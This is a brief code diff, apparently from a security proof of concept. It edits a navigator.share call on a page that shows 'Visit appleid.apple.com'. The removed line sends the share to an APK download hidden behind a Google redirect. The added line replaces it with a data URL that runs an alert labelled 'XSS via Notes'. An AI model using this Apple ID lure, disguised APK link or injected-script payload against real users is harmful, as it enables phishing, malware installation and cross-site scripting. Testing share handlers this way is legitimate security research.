@@ -7,7 +7,7 @@
       navigator.share({
         title: "",
         text: "Visit appleid.apple.com",
-        url: "https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk"
+        url: "data:text/html,<script>alert('XSS via Notes')</script>"
       }).catch(() => {});
     }, 1000);
   </script>
